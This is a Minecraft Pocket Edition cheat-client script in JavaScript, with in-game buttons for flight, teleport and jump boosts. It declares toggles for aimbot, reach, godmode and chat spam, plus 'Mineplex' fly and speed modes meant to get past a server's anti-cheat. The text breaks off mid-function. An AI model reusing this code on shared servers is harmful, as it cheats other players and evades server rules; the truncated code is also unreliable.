/*
本JS使用开挂神器合并
开挂神器创始人：小阳x
官方交流群：660516744
开挂神器为免费软件，禁止倒卖
*/
/*
本JS使用开挂神器合并
开挂神器创始人：小阳x
官方交流群：660516744
开挂神器为免费软件，禁止倒卖
*/
//我的世界
function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density)
}
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        var win = new android.widget.PopupWindow();
        var layout = new android.widget.LinearLayout(ctx);
        var button = new android.widget.Button(ctx);
        button.setText("飞")
        button.setOnClickListener(new android.view.View.OnClickListener() {
            onClick: function(v) {
                Entity.setPosition(getPlayerEnt(), Player.getX(), Player.getY() + 1, Player.getZ())
                Player.setFlying(true)
                clientMessage("§6§o§l你可以开始fly了")
            }
        });
        layout.addView(button);
        win.setContentView(layout);
        win.setWidth(105);
        win.setHeight(90);
        win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)))
        win.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, 250, 600);
    }
}));

function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density)
}
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        var win = new android.widget.PopupWindow();
        var layout = new android.widget.LinearLayout(ctx);
        var button = new android.widget.Button(ctx);
        button.setText("设")
        button.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(viewarg) {
                xxx = Player.getX()
                yyy = Player.getY()
                zzz = Player.getZ()
                clientMessage("§b§o§l设置这为传送点")
            }
        }))
        layout.addView(button);
        win.setContentView(layout);
        win.setWidth(105);
        win.setHeight(90);
        win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)))
        win.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.BOTTOM, 230, 600);
    }
}));

function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density)
}
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        var win = new android.widget.PopupWindow();
        var layout = new android.widget.LinearLayout(ctx);
        var button = new android.widget.Button(ctx);
        button.setText("回")
        button.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(viewarg) {
                if (xxx == NaN) {
                    clientMessage("§l§o§a您还没有设置传送点")
                } else {
                    setPosition(getPlayerEnt(), xxx, yyy, zzz)
                    clientMessage("§4§o§l已回到设置传送点")
                }
            }
        }))
        layout.addView(button);
        win.setContentView(layout);
        win.setWidth(105);
        win.setHeight(90);
        win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)))
        win.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.BOTTOM, 130, 600);
    }
}));
var ctx = com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get']();
var Button = android['widget']['Button'];
var LinearLayout = android['widget']['LinearLayout'];
var RelativeLayout = android['widget']['RelativeLayout'];
var PopupWindow = android['widget']['PopupWindow'];
var ScrollView = android['widget']['ScrollView'];
var TextView = android['widget']['TextView'];
var CheckBox = android['widget']['CheckBox'];
var Switch = android['widget']['Switch'];
var Toast = android['widget']['Toast'];
var Runnable = java['lang']['Runnable'];
var View = android['view']['View'];
var ColorDrawable = android['graphics']['drawable']['ColorDrawable'];
var Color = android['graphics']['Color'];
var Gravity = android['view']['Gravity'];
var Intent = android['content']['Intent'];
var Uri = android['net']['Uri'];
ModPE['langEdit']('menu.copyright', '§4随枫吖§6随枫吖: §e随枫吖已加载完成');
var bg = new android['graphics']['drawable'].GradientDrawable();
bg['setColor'](android['graphics']['Color'].RED);
bg['setStroke'](4, android['graphics']['Color']['rgb'](255, 0, 255));
bg['setCornerRadius'](2);
var ibg = new android['graphics']['drawable'].GradientDrawable();
ibg['setColor'](android['graphics']['Color'].BLACK);
ibg['setStroke'](5, android['graphics']['Color'].RED);
var mbg = new android['graphics']['drawable'].GradientDrawable();
mbg['setColor'](android['graphics']['Color'].BLACK);
mbg['setStroke'](4, android['graphics']['Color']['rgb'](255, 64, 0));
mbg['setCornerRadius'](2);
var fbg = new android['graphics']['drawable'].GradientDrawable();
fbg['setColor'](android['graphics']['Color'].BLACK);
fbg['setStroke'](5, android['graphics']['Color'].RED);
fbg['setCornerRadius'](3);
var xbg = new android['graphics']['drawable'].GradientDrawable();
xbg['setColor'](android['graphics']['Color'].MAGENTA);
xbg['setStroke'](4, android['graphics']['Color']['rgb'](255, 0, 255));
xbg['setCornerRadius'](2);
var nbg = new android['graphics']['drawable'].GradientDrawable();
nbg['setColor'](android['graphics']['Color'].BLACK);
nbg['setAlpha'](100);
var nnbg = new android['graphics']['drawable'].GradientDrawable();
nnbg['setColor'](android['graphics']['Color'].MAGENTA);
nnbg['setStroke'](4, android['graphics']['Color']['rgb'](0, 128, 128));
var iibg = new android['graphics']['drawable'].GradientDrawable();
iibg['setColor'](android['graphics']['Color'].BLACK);
iibg['setAlpha'](250);
iibg['setStroke'](2, android['graphics']['Color'].RED);
var abg = new android['graphics']['drawable'].GradientDrawable();
abg['setAlpha'](150);
abg['setColor'](android['graphics']['Color'].BLACK);
abg['setStroke'](4, android['graphics']['Color']['rgb'](255, 128, 0));
var gmbg = new android['graphics']['drawable'].GradientDrawable();
gmbg['setColor'](android['graphics']['Color'].RED);
gmbg['setStroke'](2, android['graphics']['Color']['rgb'](255, 0, 255));
gmbg['setCornerRadius'](2);
var jbg = new android['graphics']['drawable'].GradientDrawable();
jbg['setColor'](android['graphics']['Color'].RED);
jbg['setStroke'](10, android['graphics']['Color']['rgb'](255, 0, 255));
jbg['setCornerRadius'](4);
var destructbg = new android['graphics']['drawable'].GradientDrawable();
destructbg['setColor'](android['graphics']['Color'].RED);
destructbg['setStroke'](4, android['graphics']['Color']['rgb'](255, 0, 255));
var theme = nnbg;
var theme1 = mbg;
var module = nbg;
var Utils = {
    Block: {
        isLiquid: function(_0x2bf6x22) {
            if (_0x2bf6x22 >= 8 && _0x2bf6x22 <= 11) {
                return true
            };
            return false
        },
        fastBreak: function() {
            for (i = 0; i < 256; i++) {
                Block['setDestroyTime'](i, 0)
            }
        },
        isLadder: function(_0x2bf6x22) {
            if (_0x2bf6x22 == 65) {
                return true
            };
            return false
        }
    },
    Velocity: {
        calculateSpeed: function() {
            return Math['sqrt'](Math['pow'](Entity['getVelX'](getPlayerEnt()), 2) + Math['pow'](Entity['getVelZ'](getPlayerEnt()), 2))
        }
    },
    Text: {
        replaceAll: function(_0x2bf6x23, _0x2bf6x24, _0x2bf6x25) {
            var _0x2bf6x26 = _0x2bf6x25;
            return _0x2bf6x26['replace'](new RegExp(_0x2bf6x23, 'g'), _0x2bf6x24)
        }
    },
    Player: {
        isInWater: function() {
            if (Utils['Block']['isLiquid'](getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())))) {
                return true
            } else {
                return false
            }
        },
        isOnLadder: function() {
            if (Utils['Block']['isLadder'](getTile(getPlayerX(), getPlayerY() + 0.001, getPlayerZ()))) {
                return true
            } else {
                return false
            }
        },
        isOnGround: function() {
            var _0x2bf6x27 = Entity['getY'](getPlayerEnt());
            while (_0x2bf6x27 > 1) {
                _0x2bf6x27 -= 1
            };
            if ((Math['round'](_0x2bf6x27 * 100) >= 61 && Math['round'](_0x2bf6x27 * 100) <= 63) && getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())) != 0 && !Utils['Block']['isLiquid'](getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())))) {
                return true
            };
            if ((Math['round'](_0x2bf6x27 * 100) >= 11 && Math['round'](_0x2bf6x27 * 100) <= 13) && getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())) != 0 && !Utils['Block']['isLiquid'](getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())))) {
                return true
            } else {
                return false
            }
        },
        isCollidedHorizontally: function() {
            var _0x2bf6x28 = Entity['getX'](getPlayerEnt());
            var _0x2bf6x29 = Entity['getZ'](getPlayerEnt());
            var _0x2bf6x2a = Math['round'](_0x2bf6x28 - 0.5);
            var _0x2bf6x2b = Math['round'](_0x2bf6x29 - 0.5);
            while (_0x2bf6x28 < 1) {
                _0x2bf6x28 += 1
            };
            while (_0x2bf6x29 < 1) {
                _0x2bf6x29 += 1
            };
            while (_0x2bf6x28 > 1) {
                _0x2bf6x28 -= 1
            };
            while (_0x2bf6x29 > 1) {
                _0x2bf6x29 -= 1
            };
            if (Math['round'](_0x2bf6x28 * 100) == 31) {
                _0x2bf6x28 -= 0.01
            };
            if (Math['round'](_0x2bf6x29 * 100) == 31) {
                _0x2bf6x29 -= 0.01
            };
            if (Math['round'](_0x2bf6x28 * 100) == 69) {
                _0x2bf6x28 += 0.01
            };
            if (Math['round'](_0x2bf6x29 * 100) == 69) {
                _0x2bf6x29 += 0.01
            };
            if (Math['round'](_0x2bf6x28 * 100) == 30) {
                _0x2bf6x2a--
            };
            if (Math['round'](_0x2bf6x29 * 100) == 30) {
                _0x2bf6x2b--
            };
            if (Math['round'](_0x2bf6x28 * 100) == 70) {
                _0x2bf6x2a++
            };
            if (Math['round'](_0x2bf6x29 * 100) == 70) {
                _0x2bf6x2b++
            };
            if (getTile(_0x2bf6x2a, Entity['getY'](getPlayerEnt()), _0x2bf6x2b) == 0 && getTile(_0x2bf6x2a, Entity['getY'](getPlayerEnt()) - 1, _0x2bf6x2b) == 0) {
                return false
            };
            if (Block['getDestroyTime'](getTile(_0x2bf6x2a, Entity['getY'](getPlayerEnt()) - 1, _0x2bf6x2b)) <= 0.1 && Block['getDestroyTime'](getTile(_0x2bf6x2a, Entity['getY'](getPlayerEnt()), _0x2bf6x2b)) <= 0.1) {
                return false
            };
            if (Math['round'](_0x2bf6x28 * 100) == 30 || Math['round'](_0x2bf6x28 * 100) == 70) {
                return true
            };
            if (Math['round'](_0x2bf6x29 * 100) == 30 || Math['round'](_0x2bf6x29 * 100) == 70) {
                return true
            };
            return false
        }
    }
};
var GUI;
var GUIj;
var GUIe;
var GUIr;
var GUIa;
var GUIg;
var GUIz;
var GUIs;
var GUIv;
var menu;
var menu1;
var menu2;
var menu3;
var menu4;
var exitUI;
var exitcombatUI;
var exitmotionUI;
var exitplayerUI;
var exitmiscUI;
var gmChange = Level['getGameMode']();
var clr = '§';
var fct = '§l§4[§r§6随枫吖§l§4§l]§r§6: ';
var team = new Array();
var leaveG = true;
var VERSION = '5.2.0';
var NAME = '随枫吖';
var DEVELOPERS = '随枫吖';
var MODULES = '5.2.0';
var isDev = false;
var canBeDev = false;
var bypasshitbox;
var bypasshitboxs = false;
var bypasshitboxed = false;
var inpvpfly;
var inpvpflys = false;
var inpvpflyed = false;
var mineplexspeed;
var mineplexspeeds = false;
var mineplexspeeded = false;
var mineplexfly;
var mineplexflys = false;
var mineplexflyed = false;
var hitbox;
var hitboxs = false;
var hitboxed = false;
var antikbs;
var antikbss = false;
var antikbed = false;
var attKbTick;
var kbTick;
var kbHealth;
var ndglides;
var ndglidess = false;
var ndglideed = false;
var aimbots;
var aimbotss = false;
var aimboted = false;
var reachs;
var reachss = false;
var reached = false;
var switchreachs;
var switchreached = false;
var sreached = false;
var switchaims;
var switchaimed = false;
var saimed = false;
var grapples;
var grappless = false;
var grappleed = false;
var autoswords;
var autoswordss = false;
var autosworded = false;
var steps;
var stepss = false;
var steped = false;
var csteps;
var cstepss = false;
var csteped = false;
var criticalss;
var criticales = false;
var criticalsed = false;
var critTick = 0;
var criticalTick = 0;
var tapjumps;
var tapjumpss = false;
var tapjumped = false;
var taptps;
var taptpss = false;
var taptped = false;
var speeds;
var speedss = false;
var speeded = false;
var brightblockss;
var brightblocksed = false;
var blockDataValues = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 13, 141, 15, 16, 17, 18, 20, 21, 22, 24, 26, 30, 31, 32, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 53, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 68, 71, 73, 74, 78, 79, 80, 81, 82, 83, 85, 87, 92, 95, 98, 102, 103, 105, 107, 109, 108, 112, 114, 128, 155, 156, 245, 246, 247, 248, 249, 253, 254, 255];
var zoomspeeds;
var zoomspeedss = false;
var zoomspeeded = false;
var jumpspeeds;
var jumpspeedss = false;
var jumpspeeded = false;
var upglides;
var upglidess = false;
var upglideed = false;
var bowaimbots;
var bowaimbotss = false;
var bowaimboted = false;
var criticaltrailss;
var criticaltrailsss = false;
var criticaltrailsed = false;
var highjumps;
var highjumpss = false;
var highjumped = false;
var can = 1;
var canGetHP = 1;
var HP;
var gravity = -0.07840000092983246;
var derps;
var derpss = false;
var derped = false;
var twerks;
var twerkss = false;
var twerked = false;
var tCounter = 0;
var backfaces;
var backfacess = false;
var backfaceed = false;
var autowalks;
var autowalkss = false;
var autowalked = false;
var jetpacks;
var jetpackss = false;
var jetpacked = false;
var cspeeds;
var cspeedss = false;
var cspeeded = false;
var airjumps;
var airjumped = false;
var dolphins;
var dolphinss = false;
var dolphined = false;
var fallbacks;
var fallbackss = false;
var fallbacked = false;
var fallbackX = Player['getX']();
var fallbackY = Player['getY']();
var fallbackZ = Player['getZ']();
var timer = 0;
var solidliquids;
var solidliquidss = false;
var solidliquided = false;
var wallhacks;
var wallhackss = false;
var wallhacked = false;
var stealths;
var stealthss = false;
var stealthed = false;
var glides;
var glidess = false;
var glideed = false;
var glideSpeed = 0.3;
var aimassists;
var aimassistss = false;
var aimassisted = false;
var elevators;
var elevatored = false;
var snipers;
var sniperss = false;
var snipered = false;
var bypassglides;
var bypassglidess = false;
var bypassglideed = false;
var bgtick = 0;
var spams;
var spamss = false;
var spamed = false;
var spamTime = 0;
var spamDelay = 3500;
var ln = 0;
var spamText = 'Remember, no sentence when using !spam';
var hitjumps;
var hitjumpss = false;
var hitjumped = false;
var longhops;
var longhopss = false;
var longhoped = false;
var lhtick = 0;
var placetps;
var placetpss = false;
var placetped = false;
var autoclimbs;
var autoclimbss = false;
var autoclimbed = false;
var acspd = 0.4;
var sglides;
var sglidess = false;
var sglideed = false;
var dmgglides;
var dmgglidess = false;
var dmgglideed = false;
var follows;
var followss = false;
var followed = false;
var forcedestroys;
var forcedestroyss = false;
var forcedestroyed = false;
var fastbreaks;
var fastbreakss = false;
var fastbreaked = false;
var defDestroyTime = [null, 1.5, 0.6, 0.5, 2, 2, 0, -1, null, null, null, null, 0.5, 0.6, 3, 3, 3, 2, 0.2, 0.6, 0.3, 3, 3, null, 0.8, null, 0.2, 0.7, null, null, 4, 0, 0, null, null, 0.8, null, 0, 0, 0, 0, 3, 5, 2, 2, 2, 0, 1.5, 2, 50, 0, 0, null, 2, 2.5, null, 3, 5, 2.5, 0, 0.6, 3.5, 3.5, 1, 3, 0.4, 0.7, 2, 1, null, null, 5, null, 3, 3, null, null, null, 0.1, 0.5, 0.2, 0.4, 0.6, 0, null, 2, 1, 0.4, 0.3, null, 1, 0.5, null, null, -1, 3, null, 1.5, null, null, 5, 0.3, 1, 0, 0, null, 2, 2, 1.5, null, null, 2, null, 2, null, null, null, null, null, null, null, null, null, null, null, null, null, 0.8, null, null, null, null, null, 2, 2, 2, null, null, 2, null, 0, 0, null, null, null, null, null, null, null, null, null, null, null, null, 0.8, 0.8, 2, 2, null, null, null, null, null, null, null, null, null, null, null, 0.5, 0.1, 5, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, 0, 3.5, 50, 5, 0.6, 0.6, 5, null, null, null, null, 0];
var nearwarnings;
var nearwarningss = false;
var nearwarninged = false;
var nwrange = 35;
var fullbrights;
var fullbrightss = false;
var fullbrighted = false;
var leetspeaks;
var leetspeakss = false;
var leetspeaked = false;
var regenerations;
var regenerationss = false;
var regenerationed = false;
var regenX = Player['getX']();
var regenZ = Player['getZ']();
var sregens;
var sregenss = false;
var sregend = false;
var sregened = false;
var lbsgspeeds;
var lbsgspeedss = false;
var lbsgspeeded = false;
var ctrlzooms;
var ctrlzoomed = false;
var zoomed = false;
var escapes;
var escapeed = false;
var frostwalkers;
var frostwalkerss = false;
var frostwalkered = false;
var viewchangers;
var viewchangered = false;
var firepunchs;
var firepunchss = false;
var firepunched = false;
var safewalks;
var safewalkss = false;
var safewalked = false;
var scaffoldwalks;
var scaffoldwalkss = false;
var scaffoldwalked = false;
var arrowdodges;
var arrowdodgess = false;
var arrowdodgeed = false;
var behindhits;
var behindhitss = false;
var behindhited = false;
var sidereachs;
var sidereached = false;
var bedbreakers;
var bedbreakerss = false;
var bedbreakered = false;
var fastfalls;
var fastfallss = false;
var fastfalled = false;
var ghosthands;
var ghosthandss = false;
var ghosthanded = false;
var godmode;
var godmodes = false;
var godmodeed = false;

var tos;

function showChangeLog() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    ctx.runOnUiThread(new java.lang.Runnable({
        run: function() {
            try {
                var tosLayout = new android.widget.LinearLayout(ctx);
                var tosScroll = new android.widget.ScrollView(ctx);
                var tosLayout1 = new android.widget.LinearLayout(ctx);
                tosLayout.setOrientation(1);
                tosLayout1.setOrientation(1);
                tosScroll.addView(tosLayout);
                tosLayout1.addView(tosScroll);
                tosLayout.setBackground(bg);

                var tosInfo = new Button(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("随枫吖简介");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new Button(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("新的UI界面");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("醉仙网络：716069766");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("汉化了所有的指令");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("指令一定要用英文的'!'来书写哦");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("我们的QQ交流群:716069766");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("欢迎您的使用-随枫吖");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var yesBtn = new android.widget.Button(ctx);
                yesBtn.setText("确定");
                yesBtn.setTextColor(android.graphics.Color.RED);
                yesBtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                yesBtn.getBackground().setAlpha(150);
                yesBtn.setTextSize(15);
                yesBtn.setGravity(android.view.Gravity.CENTER);
                yesBtn.setOnClickListener(new android.view.View.OnClickListener({
                    onClick: function(viewarg) {
                        tos.dismiss();
                    }
                }));
                tosLayout.addView(yesBtn);

                tos = new PopupWindow(tosLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth() / 2, ctx.getWindowManager().getDefaultDisplay().getHeight() / 2);
                tos.setAnimationStyle(android.R.style.Animation_InputMethod);
                tos.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
                tos.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER | android.view.Gravity.CENTER, 0, 0);
            } catch (error) {
                print("An error occured: " + error);
            }
        }
    }));
}
showChangeLog();


function dip2px(_0x2bf6x12e) {
    return Math['ceil'](_0x2bf6x12e * ctx['getResources']()['getDisplayMetrics']()['density'])
}

function showMenuBtn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x131 = new TextView(ctx);
                if (stealthss) {
                    _0x2bf6x131['setText'](' ')
                } else {
                    _0x2bf6x131['setText']('随枫吖')
                };
                _0x2bf6x131['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x131['setTextSize'](26)
                _0x2bf6x131['setBackground'](bg);
                if (stealthss) {
                    _0x2bf6x131['getBackground']()['setAlpha'](0)
                } else {
                    _0x2bf6x131['getBackground']()['setAlpha'](150)
                };
                _0x2bf6x131['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        mainMenu();
                        exit();
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        }
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x131);
                GUI = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUI['setAnimationStyle'](android['R']['style'].Animation_Dialog);
                GUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['TOP'], 20, 10)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}
showMenuBtn();

function showJumpBtn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x134 = new TextView(ctx);
                _0x2bf6x134['setText']('枫');
                _0x2bf6x134['setTextSize'](25);
                _0x2bf6x134['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x134['setBackground'](jbg);
                _0x2bf6x134['getBackground']()['setAlpha'](150);
                _0x2bf6x134['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        setVelY(getPlayerEnt(), 0.4)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x134);
                GUIj = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIj['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIj['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 110, 135)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showElevatorBtn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x136 = new Button(ctx);
                _0x2bf6x136['setText']('向上');
                _0x2bf6x136['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x136['setBackground'](theme);
                _0x2bf6x136['setPadding'](10, 10, 10, 10);
                _0x2bf6x136['getBackground']()['setAlpha'](150);
                _0x2bf6x136['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        Entity['setPositionRelative'](getPlayerEnt(), 0, +2.53, 0)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x136);
                var _0x2bf6x137 = new Button(ctx);
                _0x2bf6x137['setText']('向下');
                _0x2bf6x137['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x137['setBackground'](theme);
                _0x2bf6x137['setPadding'](10, 10, 10, 10);
                _0x2bf6x137['getBackground']()['setAlpha'](150);
                _0x2bf6x137['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        Entity['setPosition'](getPlayerEnt(), getPlayerX(), getPlayerY() - 1.01, getPlayerZ())
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x137);
                GUIe = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIe['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIe['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['CENTER'], 0, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showEscapeBtn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x139 = new Button(ctx);
                _0x2bf6x139['setText']('闪现');
                _0x2bf6x139['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x139['setBackground'](theme);
                _0x2bf6x139['getBackground']()['setAlpha'](150);
                _0x2bf6x139['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        var _0x2bf6x13a = [0, 0, 0];
                        toDirectionalVector(_0x2bf6x13a, (getYaw() + 90) * Math['PI'] / 180, getPitch() * Math['PI'] / 180 * -1);
                        setVelX(getPlayerEnt(), 6 * _0x2bf6x13a[0]);
                        setVelZ(getPlayerEnt(), 6 * _0x2bf6x13a[2])
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x139);
                GUIs = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIs['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIs['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['CENTER'], 0, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showReachSwitch() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x13c = new android['widget'].ToggleButton(ctx);
                _0x2bf6x13c['setText']('长臂猿');
                _0x2bf6x13c['setTextOn']('长臂猿');
                _0x2bf6x13c['setTextOff']('长臂猿');
                _0x2bf6x13c['setChecked'](sreached);
                _0x2bf6x13c['setTextSize'](18);
                _0x2bf6x13c['setBackground'](bg);
                _0x2bf6x13c['getBackground']()['setAlpha'](150);
                _0x2bf6x13c['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x13c['setOnClickListener'](new android['view']['View'].OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        if (!sreached) {
                            sreached = true;
                            Level['setGameMode'](1);
                            Player['setCanFly'](false);
                            _0x2bf6x13c['setBackground'](abg)
                        } else {
                            sreached = false;
                            Level['setGameMode'](0);
                            _0x2bf6x13c['setBackground'](bg)
                        };
                        _0x2bf6x13c['setChecked'](sreached)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x13c);
                GUIr = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIr['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIr['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['TOP'], 100, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showAimSwitch() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x13e = new android['widget'].ToggleButton(ctx);
                _0x2bf6x13e['setText']('自瞄');
